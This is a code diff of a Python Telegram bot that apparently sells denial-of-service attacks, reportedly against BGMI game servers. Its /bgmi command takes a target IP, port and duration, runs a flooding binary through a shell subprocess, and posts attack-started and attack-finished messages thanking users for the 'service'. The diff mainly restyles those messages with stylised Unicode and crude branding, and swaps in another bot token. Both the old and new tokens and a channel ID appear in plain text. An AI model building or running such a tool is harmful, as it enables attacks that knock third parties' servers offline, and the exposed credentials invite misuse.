@@ -25,7 +25,7 @@ except Exception as e:
     print("[Proxy Test] Proxy error:", e)
 
 # === Bot Configuration ===
-TOKEN = '7848878988:AAGCZ84K753AkyMahQmlwpMFDhlUVK6_OUA'  # Replace with your actual token
+TOKEN = '7848878988:AAHFlYa_ggNW2siLakeEwXuSWihqhYj0J-s'  # Replace with your actual token
 CHANNEL_ID = '-1002678249799'  # Replace with your group/channel ID
 
 # === Telebot Setup ===
@@ -77,7 +77,7 @@ def bgmi_command(message):
     chat_id = str(message.chat.id)
 
     if chat_id != CHANNEL_ID:
-        bot.send_message(chat_id, "⚠️ Unauthorized group. Join @freebotalone.")
+        bot.send_message(chat_id, "⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @freebotalone  ⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : OUR ADMINS ]")
         return
 
     reset_daily_counts()
@@ -108,11 +108,11 @@ def bgmi_command(message):
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("Usage: /bgmi <ip> <port> <duration>")
+            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
 
         ip, port, duration = args
         if int(duration) > 240:
-            bot.send_message(chat_id, "Duration exceeds max limit of 240 seconds.")
+            bot.send_message(chat_id, "⛔ 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣 𝙚𝙭𝙘𝙚𝙚𝙙𝙨 𝙩𝙝𝙚 𝙢𝙖𝙭 𝙡𝙞𝙢𝙞𝙩 𝙤𝙛 {240} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙙𝙪𝙘𝙚 𝙞𝙩.")
             return
         if not is_valid_ip(ip) or not is_valid_port(port) or not is_valid_duration(duration):
             raise ValueError("Invalid IP, port, or duration.")
@@ -122,17 +122,17 @@ def bgmi_command(message):
             user_photos[user_id] = False
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
-        bot.send_message(chat_id, f"Attack started on {ip}:{port} for {duration}s.")
+        bot.send_message(chat_id, f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 💥 \n\n Requested Target : {ip} \n\n Requseted Port   : {port}\n\n Requested Time  : {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n\n 📢 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 📢")
         threading.Thread(target=lambda: asyncio.run(run_attack_command_async(ip, int(port), int(duration)))).start()
     except Exception as e:
-        bot.send_message(chat_id, f"Error: {e}")
+        bot.send_message(chat_id, f"┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n\n : {e}")
 
 async def run_attack_command_async(ip, port, duration):
     try:
         cmd = f"./fuck {ip} {port} {duration}"
         process = await asyncio.create_subprocess_shell(cmd)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"Attack on {ip}:{port} completed.")
+        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 Finished ❣️\n\nRequested ip : {ip} \n\n Requested port : {port} \n\n [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰e 💘 <> 𝗧𝗲𝗮m ★ȺŁØNɆ☂ꔪ™")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"Attack failed: {e}")
 
